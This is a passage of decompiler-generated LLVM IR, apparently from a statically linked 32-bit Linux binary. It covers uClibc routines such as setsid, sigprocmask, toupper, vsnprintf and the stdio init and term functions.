  %v0_805f807 = load i32, i32* @esi, align 4
  %v0_805f808 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg5, i32* @ebx, align 4
  %v0_805f824 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805f82a = icmp eq i32 %v0_805f824, 0
  %v1_805f82c = icmp eq i1 %v1_805f82a, false
  br i1 %v1_805f82c, label %entry.dec_label_pc_805f847_crit_edge, label %dec_label_pc_805f82e

entry.dec_label_pc_805f847_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805f847

dec_label_pc_805f82e:                             ; preds = %entry
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805f808, i32* @ebx, align 4
  store i32 %v0_805f807, i32* @esi, align 4
  store i32 %v0_805f806, i32* @edi, align 4
  store i32 %v0_805f805, i32* @ebp, align 4
  %v2_805f845 = call i32 @__syscall_select(i32 %arg1, i32 %v0_805f808)
  br label %dec_label_pc_805f847

dec_label_pc_805f847:                             ; preds = %entry.dec_label_pc_805f847_crit_edge, %dec_label_pc_805f82e
  %stack_var_8.0 = phi i32 [ %arg2, %entry.dec_label_pc_805f847_crit_edge ], [ %arg5, %dec_label_pc_805f82e ]
  %stack_var_4.0 = phi i32 [ %arg1, %entry.dec_label_pc_805f847_crit_edge ], [ %arg4, %dec_label_pc_805f82e ]
  %v4_805f847 = call i32 @__libc_enable_asynccancel(i32 %stack_var_4.0, i32 %stack_var_8.0, i32 %arg3, i32 %arg4)
  %v0_805f84c = load i32, i32* @ebp, align 4
  store i32 %v0_805f84c, i32* @ecx, align 4
  %v0_805f84e = load i32, i32* @esi, align 4
  store i32 %v0_805f84e, i32* @edx, align 4
  %v0_805f854 = load i32, i32* @ebx, align 4
  %v0_805f855 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v2_805f85a = call i32 @__syscall_select(i32 %v0_805f855, i32 %v0_805f854)
  store i32 %v2_805f85a, i32* @ebx, align 4
  store i32 %v0_805f854, i32* @edx, align 4
  store i32 %v4_805f847, i32* @eax, align 4
  %v1_805f867 = call i32 @__libc_disable_asynccancel(i32 %v0_805f855)
  %v0_805f86f = load i32, i32* @ebx, align 4
  store i32 %v0_805f808, i32* @ebx, align 4
  store i32 %v0_805f807, i32* @esi, align 4
  store i32 %v0_805f806, i32* @edi, align 4
  store i32 %v0_805f805, i32* @ebp, align 4
  ret i32 %v0_805f86f

; uselistorder directives
  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805f847, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %v0_805f87d = call i32 @setsid()
  %tmp = icmp ult i32 %v0_805f87d, -4095
  br i1 %tmp, label %dec_label_pc_805f896, label %dec_label_pc_805f889

dec_label_pc_805f889:                             ; preds = %entry
  %v1_805f88e = sub i32 0, %v0_805f87d
  store i32 %v1_805f88e, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f896

dec_label_pc_805f896:                             ; preds = %entry, %dec_label_pc_805f889
  %v0_805f896 = phi i32 [ %v0_805f87d, %entry ], [ -1, %dec_label_pc_805f889 ]
  ret i32 %v0_805f896

; uselistorder directives
  uselistorder i32 %v0_805f87d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805f896, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v12_805f899 = ptrtoint i32* %stack_var_-20 to i32
  %v4_805f89c = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  %v1_805f8a0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v1_805f8a0, label %dec_label_pc_805f8c9, label %dec_label_pc_805f8a4

dec_label_pc_805f8a4:                             ; preds = %entry
  %v1_805f8a4 = getelementptr inbounds %_TYPEDEF_sigset_t, %_TYPEDEF_sigset_t* %arg2, i32 0, i32 0, i32 0
  %v2_805f8a4 = load i32, i32* %v1_805f8a4, align 4
  %v4_805f8a4 = icmp slt i32 %v2_805f8a4, 0
  br i1 %v4_805f8a4, label %dec_label_pc_805f8af, label %dec_label_pc_805f8a9

dec_label_pc_805f8a9:                             ; preds = %dec_label_pc_805f8a4
  %.pre = add i32 %v4_805f89c, 4
  %v2_805f8a9 = inttoptr i32 %.pre to i8*
  %v3_805f8a9 = load i8, i8* %v2_805f8a9, align 1
  %v4_805f8a9 = urem i8 %v3_805f8a9, 2
  %v5_805f8a9 = icmp eq i8 %v4_805f8a9, 0
  br i1 %v5_805f8a9, label %dec_label_pc_805f8c9, label %dec_label_pc_805f8af

dec_label_pc_805f8af:                             ; preds = %dec_label_pc_805f8a4, %dec_label_pc_805f8a9
  %v2_805f8b2 = load i32, i32* %v1_805f8a4, align 4
  %v2_805f8b4 = ptrtoint i32* %stack_var_-12 to i32
  %v1_805f8bb = urem i32 %v2_805f8b2, -2147483648
  store i32 %v1_805f8bb, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805f8c9

dec_label_pc_805f8c9:                             ; preds = %dec_label_pc_805f8a9, %entry, %dec_label_pc_805f8af
  %v1_805f8de = phi i32 [ %v4_805f89c, %dec_label_pc_805f8a9 ], [ %v4_805f89c, %entry ], [ %v2_805f8b4, %dec_label_pc_805f8af ]
  store i32 %arg3, i32* @edx, align 4
  %v2_805f8de = inttoptr i32 %v1_805f8de to %_TYPEDEF_sigset_t*
  %v6_805f8de = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v2_805f8de, %_TYPEDEF_sigset_t* %tmp6)
  %tmp = icmp ult i32 %v6_805f8de, -4095
  br i1 %tmp, label %dec_label_pc_805f8f8, label %dec_label_pc_805f8eb

dec_label_pc_805f8eb:                             ; preds = %dec_label_pc_805f8c9
  %v1_805f8f0 = sub i32 0, %v6_805f8de
  store i32 %v1_805f8f0, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_805f8f8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805f8f8

dec_label_pc_805f8f8:                             ; preds = %dec_label_pc_805f8c9, %dec_label_pc_805f8eb
  %v0_805f8fc = phi i32 [ %v6_805f8de, %dec_label_pc_805f8c9 ], [ -1, %dec_label_pc_805f8eb ]
  %v0_805f8f8 = phi i32 [ %v12_805f899, %dec_label_pc_805f8c9 ], [ %v0_805f8f8.pre, %dec_label_pc_805f8eb ]
  %v1_805f8f8 = add i32 %v0_805f8f8, 16
  %v3_805f8f8 = xor i32 %v0_805f8f8, -2147483648
  %v4_805f8f8 = and i32 %v1_805f8f8, %v3_805f8f8
  %v5_805f8f8 = icmp slt i32 %v4_805f8f8, 0
  store i1 %v5_805f8f8, i1* @of, align 1
  ret i32 %v0_805f8fc

; uselistorder directives
  uselistorder i32 %v0_805f8f8, { 1, 0 }
  uselistorder i32 %v6_805f8de, { 1, 2, 0 }
  uselistorder i32 %v4_805f89c, { 1, 2, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805f8f8, { 1, 0 }
  uselistorder label %dec_label_pc_805f8c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805f8af, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %v0_805f904 = load i32, i32* @ebx, align 4
  %v2_805f90b = call i32 @time(i32* %arg1)
  store i32 %v0_805f904, i32* @ebx, align 4
  ret i32 %v2_805f90b
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805f914 = load i32, i32* inttoptr (i32 134682880 to i32*), align 256
  %v2_805f919 = mul i32 %arg1, 2
  %v3_805f919 = add i32 %v0_805f914, %v2_805f919
  %v4_805f919 = inttoptr i32 %v3_805f919 to i16*
  %v5_805f919 = load i16, i16* %v4_805f919, align 2
  %v6_805f919 = zext i16 %v5_805f919 to i32
  %v1_805f91d = and i32 %v6_805f919, 32
  ret i32 %v1_805f91d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805f928 = add i32 %arg1, 128
  %v6_805f933 = icmp ugt i32 %v1_805f928, 383
  br i1 %v6_805f933, label %dec_label_pc_805f93e, label %dec_label_pc_805f935

dec_label_pc_805f935:                             ; preds = %entry
  %v0_805f935 = load i32, i32* inttoptr (i32 134682888 to i32*), align 8
  %v2_805f93a = mul i32 %arg1, 2
  %v3_805f93a = add i32 %v0_805f935, %v2_805f93a
  %v4_805f93a = inttoptr i32 %v3_805f93a to i16*
  %v5_805f93a = load i16, i16* %v4_805f93a, align 2
  %v6_805f93a = sext i16 %v5_805f93a to i32
  br label %dec_label_pc_805f93e

dec_label_pc_805f93e:                             ; preds = %entry, %dec_label_pc_805f935
  %v0_805f93e = phi i32 [ %arg1, %entry ], [ %v6_805f93a, %dec_label_pc_805f935 ]
  ret i32 %v0_805f93e

; uselistorder directives
  uselistorder label %dec_label_pc_805f93e, { 1, 0 }
}

define i32 @__GI___errno_location(i32 %arg1) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_805f977 = ptrtoint i32* %stack_var_16 to i32
  %v4_805f98c = inttoptr i32 %arg1 to i8*
  %v5_805f98c = call i32 @__GI_vsnprintf(i8* %v4_805f98c, i32 %arg2, i32 %arg3, i32 %v2_805f977)
  ret i32 %v5_805f98c
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805f99b = ptrtoint i32* %stack_var_12 to i32
  %v4_805f9ae = inttoptr i32 %arg1 to i8*
  %v5_805f9ae = call i32 @__GI_vsnprintf(i8* %v4_805f9ae, i32 -1, i32 %arg2, i32 %v2_805f99b)
  ret i32 %v5_805f9ae
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_805f9b8 = load i32, i32* @ebx, align 4
  %v4_805f9bc = ptrtoint i8* %arg1 to i32
  store i32 %v4_805f9bc, i32* %edx.global-to-local, align 4
  store i32 208, i32* %stack_var_-72, align 4
  %v1_805f9d5 = sub i32 -1, %v4_805f9bc
  %tmp = icmp uge i32 %v1_805f9d5, %arg2
  %v5_805f9d9 = select i1 %tmp, i32 %arg2, i32 %v1_805f9d5
  store i32 %v5_805f9d9, i32* @ebx, align 4
  %v2_805fa34 = ptrtoint i32* %stack_var_-72 to i32
  %v3_805fa39 = inttoptr i32 %arg3 to i8*
  %v4_805fa39 = call i32 @_vfprintf_internal(i32 %v2_805fa34, i8* %v3_805fa39, i32 %arg4)
  %v1_805fa41 = icmp eq i32 %v5_805f9d9, 0
  store i32 %v4_805fa39, i32* %edx.global-to-local, align 4
  br i1 %v1_805fa41, label %dec_label_pc_805fa5d, label %dec_label_pc_805fa56

dec_label_pc_805fa56:                             ; preds = %entry
  store i8 0, i8* %arg1, align 1
  %v0_805fa60.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805fa5d

dec_label_pc_805fa5d:                             ; preds = %entry, %dec_label_pc_805fa56
  %v0_805fa60 = phi i32 [ %v4_805fa39, %entry ], [ %v0_805fa60.pre, %dec_label_pc_805fa56 ]
  store i32 %v0_805f9b8, i32* @ebx, align 4
  ret i32 %v0_805fa60

; uselistorder directives
  uselistorder i32 %v1_805f9d5, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805fa5d, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805fa64 = load i32, i32* @esi, align 4
  %v0_805fa65 = load i32, i32* @ebx, align 4
  store i32 %v0_805fa65, i32* %stack_var_-8, align 4
  store i32 -8, i32* @esi, align 4
  %v2_805fa6f = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_805fa6f, i32* @ebx, align 4
  %v1_805fa74 = call i32 @isatty(i32 0)
  %v1_805fa7c = icmp eq i32 %v1_805fa74, 0
  %v1_805fa7e = icmp eq i1 %v1_805fa7c, false
  br i1 %v1_805fa7e, label %dec_label_pc_805fa8e, label %dec_label_pc_805fa80

dec_label_pc_805fa80:                             ; preds = %entry
  %v0_805fa80 = load i32, i32* @global_var_8071928.1560, align 8
  %v1_805fa85 = udiv i32 %v0_805fa80, 256
  %v3_805fa85 = and i32 %v1_805fa85, 255
  %v9_805fa85 = xor i32 %v3_805fa85, 1
  %v11_805fa85 = mul nuw nsw i32 %v9_805fa85, 256
  %v12_805fa85 = and i32 %v0_805fa80, 255
  %v13_805fa85 = or i32 %v11_805fa85, %v12_805fa85
  %v1_805fa88 = trunc i32 %v13_805fa85 to i16
  store i16 %v1_805fa88, i16* bitcast (i32* @global_var_8071928.1560 to i16*), align 8
  br label %dec_label_pc_805fa8e

dec_label_pc_805fa8e:                             ; preds = %entry, %dec_label_pc_805fa80
  %v1_805fa93 = call i32 @isatty(i32 1)
  %v1_805fa9b = icmp eq i32 %v1_805fa93, 0
  %v1_805fa9d = icmp eq i1 %v1_805fa9b, false
  br i1 %v1_805fa9d, label %dec_label_pc_805faad, label %dec_label_pc_805fa9f

dec_label_pc_805fa9f:                             ; preds = %dec_label_pc_805fa8e
  %v0_805fa9f = load i32, i32* @global_var_807196c.1561, align 4
  %v1_805faa4 = udiv i32 %v0_805fa9f, 256
  %v3_805faa4 = and i32 %v1_805faa4, 255
  %v9_805faa4 = xor i32 %v3_805faa4, 1
  %v11_805faa4 = mul nuw nsw i32 %v9_805faa4, 256
  %v12_805faa4 = and i32 %v0_805fa9f, 255
  %v13_805faa4 = or i32 %v11_805faa4, %v12_805faa4
  %v1_805faa7 = trunc i32 %v13_805faa4 to i16
  store i16 %v1_805faa7, i16* bitcast (i32* @global_var_807196c.1561 to i16*), align 4
  br label %dec_label_pc_805faad

dec_label_pc_805faad:                             ; preds = %dec_label_pc_805fa8e, %dec_label_pc_805fa9f
  %v0_805faad = load i32, i32* @ebx, align 4
  %v1_805faad = load i32, i32* @esi, align 4
  %v2_805faad = inttoptr i32 %v1_805faad to i32*
  store i32 %v0_805faad, i32* %v2_805faad, align 4
  %v2_805fab0 = load i32, i32* %stack_var_-12, align 4
  %v2_805fab1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805fab1, i32* @ebx, align 4
  store i32 %v0_805fa64, i32* @esi, align 4
  ret i32 %v2_805fab0

; uselistorder directives
  uselistorder i32 %v0_805fa9f, { 1, 0 }
  uselistorder i32 %v0_805fa80, { 1, 0 }
  uselistorder label %dec_label_pc_805faad, { 1, 0 }
  uselistorder label %dec_label_pc_805fa8e, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805fab4 = load i32, i32* @ebx, align 4
  %v0_805fab8 = load i32, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 32
  store i32 %v0_805fab8, i32* @ecx, align 4
  store i32 0, i32* @global_var_8075b6c.1564, align 4
  store i32 0, i32* @global_var_8075b68.1565, align 8
  store i32 0, i32* @global_var_8075b64.1566, align 4
  store i32 0, i32* @global_var_8075b78.1567, align 8
  store i32 0, i32* @global_var_8075b74.1568, align 4
  store i32 0, i32* @global_var_8075b70.1569, align 16
  %v0_805fafa = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_805fafa, i32* %ebx.global-to-local, align 4
  %v1_805fb6612 = icmp eq i32 %v0_805fab8, 0
  %v1_805fb6819 = icmp eq i1 %v1_805fb6612, false
  br i1 %v1_805fb6819, label %dec_label_pc_805fb03, label %dec_label_pc_805fb86.preheader

dec_label_pc_805fb03:                             ; preds = %entry, %dec_label_pc_805fb47.dec_label_pc_805fb03_crit_edge
  %v4_805fb03 = phi i32 [ %v4_805fb03.pre, %dec_label_pc_805fb47.dec_label_pc_805fb03_crit_edge ], [ %v0_805fafa, %entry ]
  %v17_805fb2e = phi i32 [ %v3_805fb63, %dec_label_pc_805fb47.dec_label_pc_805fb03_crit_edge ], [ %v0_805fab8, %entry ]
  %v1_805fb03 = add i32 %v17_805fb2e, 64
  %v2_805fb03 = inttoptr i32 %v1_805fb03 to i32*
  %v3_805fb03 = load i32, i32* %v2_805fb03, align 4
  %v15_805fb03 = icmp eq i32 %v3_805fb03, %v4_805fb03
  br i1 %v15_805fb03, label %dec_label_pc_805fb2e, label %dec_label_pc_805fb08

dec_label_pc_805fb08:                             ; preds = %dec_label_pc_805fb03
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805fb0f = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805fb0f = icmp eq i32 %v0_805fb0f, 0
  call void @__pseudo_cond_branch(i1 %v1_805fb0f, i32 134609690)
  %v0_805fb19 = load i32, i32* @ecx, align 4
  %v1_805fb19 = add i32 %v0_805fb19, 56
  %v2_805fb19 = inttoptr i32 %v1_805fb19 to i32*
  %v3_805fb19 = load i32, i32* %v2_805fb19, align 4
  %v4_805fb19 = load i32, i32* %edx.global-to-local, align 4
  %v5_805fb19 = load i32, i32* %eax.global-to-local, align 4
  %v16_805fb19 = icmp eq i32 %v5_805fb19, %v3_805fb19
  %v23_805fb19 = select i1 %v16_805fb19, i32 %v4_805fb19, i32 %v3_805fb19
  store i32 %v23_805fb19, i32* %v2_805fb19, align 4
  store i32 %v3_805fb19, i32* @eax, align 4
  %v1_805fb1e = icmp eq i32 %v3_805fb19, 0
  %v1_805fb20 = icmp eq i1 %v1_805fb1e, false
  br i1 %v1_805fb20, label %dec_label_pc_805fb33, label %dec_label_pc_805fb22

dec_label_pc_805fb22:                             ; preds = %dec_label_pc_805fb08
  %v0_805fb22 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805fb22 = load i32, i32* @ecx, align 4
  %v2_805fb22 = add i32 %v1_805fb22, 64
  %v3_805fb22 = inttoptr i32 %v2_805fb22 to i32*
  store i32 %v0_805fb22, i32* %v3_805fb22, align 4
  %v0_805fb25 = load i32, i32* @ecx, align 4
  %v1_805fb25 = add i32 %v0_805fb25, 60
  %v2_805fb25 = inttoptr i32 %v1_805fb25 to i32*
  store i32 1, i32* %v2_805fb25, align 4
  br label %dec_label_pc_805fb47

dec_label_pc_805fb2e:                             ; preds = %dec_label_pc_805fb03
  %v1_805fb2e = add i32 %v17_805fb2e, 60
  %v2_805fb2e = inttoptr i32 %v1_805fb2e to i32*
  %v3_805fb2e = load i32, i32* %v2_805fb2e, align 4
  %v4_805fb2e = add i32 %v3_805fb2e, 1
  store i32 %v4_805fb2e, i32* %v2_805fb2e, align 4
  br label %dec_label_pc_805fb47

dec_label_pc_805fb33:                             ; preds = %dec_label_pc_805fb08
  %v0_805fb33 = load i32, i32* @ecx, align 4
  %v1_805fb33 = add i32 %v0_805fb33, 8
  %v2_805fb33 = inttoptr i32 %v1_805fb33 to i32*
  %v3_805fb33 = load i32, i32* %v2_805fb33, align 4
  store i32 %v3_805fb33, i32* @eax, align 4
  %v1_805fb36 = inttoptr i32 %v0_805fb33 to i16*
  store i16 48, i16* %v1_805fb36, align 2
  %v0_805fb3b = load i32, i32* @eax, align 4
  %v1_805fb3b = load i32, i32* @ecx, align 4
  %v2_805fb3b = add i32 %v1_805fb3b, 24
  %v3_805fb3b = inttoptr i32 %v2_805fb3b to i32*
  store i32 %v0_805fb3b, i32* %v3_805fb3b, align 4
  %v0_805fb3e = load i32, i32* @eax, align 4
  %v1_805fb3e = load i32, i32* @ecx, align 4
  %v2_805fb3e = add i32 %v1_805fb3e, 28
  %v3_805fb3e = inttoptr i32 %v2_805fb3e to i32*
  store i32 %v0_805fb3e, i32* %v3_805fb3e, align 4
  %v0_805fb41 = load i32, i32* @eax, align 4
  %v1_805fb41 = load i32, i32* @ecx, align 4
  %v2_805fb41 = add i32 %v1_805fb41, 16
  %v3_805fb41 = inttoptr i32 %v2_805fb41 to i32*
  store i32 %v0_805fb41, i32* %v3_805fb41, align 4
  %v0_805fb44 = load i32, i32* @eax, align 4
  %v1_805fb44 = load i32, i32* @ecx, align 4
  %v2_805fb44 = add i32 %v1_805fb44, 20
  %v3_805fb44 = inttoptr i32 %v2_805fb44 to i32*
  store i32 %v0_805fb44, i32* %v3_805fb44, align 4
  br label %dec_label_pc_805fb47

dec_label_pc_805fb47:                             ; preds = %dec_label_pc_805fb2e, %dec_label_pc_805fb22, %dec_label_pc_805fb33
  %v0_805fb47 = load i32, i32* @ecx, align 4
  %v1_805fb47 = add i32 %v0_805fb47, 52
  %v2_805fb47 = inttoptr i32 %v1_805fb47 to i32*
  store i32 1, i32* %v2_805fb47, align 4
  %v0_805fb4e = load i32, i32* @ecx, align 4
  %v1_805fb4e = add i32 %v0_805fb4e, 64
  %v2_805fb4e = inttoptr i32 %v1_805fb4e to i32*
  store i32 0, i32* %v2_805fb4e, align 4
  %v0_805fb55 = load i32, i32* @ecx, align 4
  %v1_805fb55 = add i32 %v0_805fb55, 60
  %v2_805fb55 = inttoptr i32 %v1_805fb55 to i32*
  store i32 0, i32* %v2_805fb55, align 4
  %v0_805fb5c = load i32, i32* @ecx, align 4
  %v1_805fb5c = add i32 %v0_805fb5c, 56
  %v2_805fb5c = inttoptr i32 %v1_805fb5c to i32*
  store i32 0, i32* %v2_805fb5c, align 4
  %v0_805fb63 = load i32, i32* @ecx, align 4
  %v1_805fb63 = add i32 %v0_805fb63, 32
  %v2_805fb63 = inttoptr i32 %v1_805fb63 to i32*
  %v3_805fb63 = load i32, i32* %v2_805fb63, align 4
  store i32 %v3_805fb63, i32* @ecx, align 4
  %v1_805fb66 = icmp eq i32 %v3_805fb63, 0
  %v1_805fb68 = icmp eq i1 %v1_805fb66, false
  br i1 %v1_805fb68, label %dec_label_pc_805fb47.dec_label_pc_805fb03_crit_edge, label %dec_label_pc_805fb66.dec_label_pc_805fb86.preheader_crit_edge

dec_label_pc_805fb47.dec_label_pc_805fb03_crit_edge: ; preds = %dec_label_pc_805fb47
  %v4_805fb03.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805fb03

dec_label_pc_805fb66.dec_label_pc_805fb86.preheader_crit_edge: ; preds = %dec_label_pc_805fb47
  %storemerge2.pre = load i32, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 4
  br label %dec_label_pc_805fb86.preheader

dec_label_pc_805fb86.preheader:                   ; preds = %dec_label_pc_805fb66.dec_label_pc_805fb86.preheader_crit_edge, %entry
  %storemerge2 = phi i32 [ %storemerge2.pre, %dec_label_pc_805fb66.dec_label_pc_805fb86.preheader_crit_edge ], [ %v0_805fab8, %entry ]
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_805fb863 = icmp eq i32 %storemerge2, 0
  %v1_805fb8810 = icmp eq i1 %v1_805fb863, false
  br i1 %v1_805fb8810, label %dec_label_pc_805fb72.lr.ph, label %dec_label_pc_805fb8a

dec_label_pc_805fb72.lr.ph:                       ; preds = %dec_label_pc_805fb86.preheader
  br label %dec_label_pc_805fb72

dec_label_pc_805fb72:                             ; preds = %dec_label_pc_805fb72.lr.ph, %dec_label_pc_805fb83
  %v0_805fb7a = phi i32 [ %storemerge2, %dec_label_pc_805fb72.lr.ph ], [ %storemerge, %dec_label_pc_805fb83 ]
  %v1_805fb72 = inttoptr i32 %v0_805fb7a to i8*
  %v2_805fb72 = load i8, i8* %v1_805fb72, align 1
  %v3_805fb72 = and i8 %v2_805fb72, 64
  %v4_805fb72 = icmp eq i8 %v3_805fb72, 0
  br i1 %v4_805fb72, label %dec_label_pc_805fb83, label %dec_label_pc_805fb77

dec_label_pc_805fb77:                             ; preds = %dec_label_pc_805fb72
  %v2_805fb7b = call i32 @__stdio_wcommit(i32 %v0_805fb7a)
  store i32 %v2_805fb7b, i32* @eax, align 4
  %v0_805fb83.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805fb83

dec_label_pc_805fb83:                             ; preds = %dec_label_pc_805fb72, %dec_label_pc_805fb77
  %v0_805fb83 = phi i32 [ %v0_805fb7a, %dec_label_pc_805fb72 ], [ %v0_805fb83.pre, %dec_label_pc_805fb77 ]
  %v1_805fb83 = add i32 %v0_805fb83, 32
  %v2_805fb83 = inttoptr i32 %v1_805fb83 to i32*
  %storemerge = load i32, i32* %v2_805fb83, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_805fb86 = icmp eq i32 %storemerge, 0
  %v1_805fb88 = icmp eq i1 %v1_805fb86, false
  br i1 %v1_805fb88, label %dec_label_pc_805fb72, label %dec_label_pc_805fb8a

dec_label_pc_805fb8a:                             ; preds = %dec_label_pc_805fb83, %dec_label_pc_805fb86.preheader
  %v2_805fb8a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805fb8a, i32* %edx.global-to-local, align 4
  store i32 %v0_805fab4, i32* %ebx.global-to-local, align 4
  %v0_805fb8d = load i32, i32* @eax, align 4
  ret i32 %v0_805fb8d

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %storemerge2, { 0, 2, 1 }
  uselistorder i32 %v3_805fb63, { 1, 2, 0 }
  uselistorder i32 %v3_805fb19, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805fab8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805fb83, { 1, 0 }
  uselistorder label %dec_label_pc_805fb72, { 1, 0 }
  uselistorder label %dec_label_pc_805fb47, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805fb03, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805fb90 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805fb98 = add i32 %arg1, 8
  %v2_805fb98 = inttoptr i32 %v1_805fb98 to i32*
  %v3_805fb98 = load i32, i32* %v2_805fb98, align 4
  store i32 %v3_805fb98, i32* %edx.global-to-local, align 4
  %v1_805fb9b = add i32 %arg1, 16
  %v2_805fb9b = inttoptr i32 %v1_805fb9b to i32*
  %v3_805fb9b = load i32, i32* %v2_805fb9b, align 4
  %v2_805fb9e = sub i32 %v3_805fb9b, %v3_805fb98
  %v12_805fb9e = icmp eq i32 %v2_805fb9e, 0
  store i32 %v2_805fb9e, i32* %eax.global-to-local, align 4
  br i1 %v12_805fb9e, label %dec_label_pc_805fbb1, label %dec_label_pc_805fba2

dec_label_pc_805fba2:                             ; preds = %entry
  store i32 %v3_805fb98, i32* %v2_805fb9b, align 4
  %v0_805fba5 = load i32, i32* @ecx, align 4
  %v0_805fba6 = load i32, i32* %eax.global-to-local, align 4
  %v0_805fba7 = load i32, i32* %edx.global-to-local, align 4
  %v0_805fba8 = load i32, i32* @ebx, align 4
  %v4_805fba9 = inttoptr i32 %v0_805fba8 to i16*
  %v5_805fba9 = call i32 @__stdio_WRITE(i16* %v4_805fba9, i32 %v0_805fba7, i32 %v0_805fba6, i32 %v0_805fba5)
  store i32 %v5_805fba9, i32* %eax.global-to-local, align 4
  %v0_805fbb1.pre = load i32, i32* @ebx, align 4
  %v2_805fbb7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805fbb1

dec_label_pc_805fbb1:                             ; preds = %entry, %dec_label_pc_805fba2
  %v2_805fbb7 = phi i32 [ %tmp11, %entry ], [ %v2_805fbb7.pre, %dec_label_pc_805fba2 ]
  %v0_805fbb1 = phi i32 [ %arg1, %entry ], [ %v0_805fbb1.pre, %dec_label_pc_805fba2 ]
  %v1_805fbb1 = add i32 %v0_805fbb1, 16
  %v2_805fbb1 = inttoptr i32 %v1_805fbb1 to i32*
  %v3_805fbb1 = load i32, i32* %v2_805fbb1, align 4
  store i32 %v3_805fbb1, i32* %eax.global-to-local, align 4
  %v2_805fbb4 = add i32 %v0_805fbb1, 8
  %v3_805fbb4 = inttoptr i32 %v2_805fbb4 to i32*
  %v4_805fbb4 = load i32, i32* %v3_805fbb4, align 4
  %v5_805fbb4 = sub i32 %v3_805fbb1, %v4_805fbb4
  store i32 %v5_805fbb4, i32* %eax.global-to-local, align 4
  store i32 %v2_805fbb7, i32* @edx, align 4
  store i32 %v0_805fb90, i32* @ebx, align 4
  ret i32 %v5_805fbb4

; uselistorder directives
  uselistorder i32 %v0_805fbb1, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805fbb1, { 1, 0 }
}

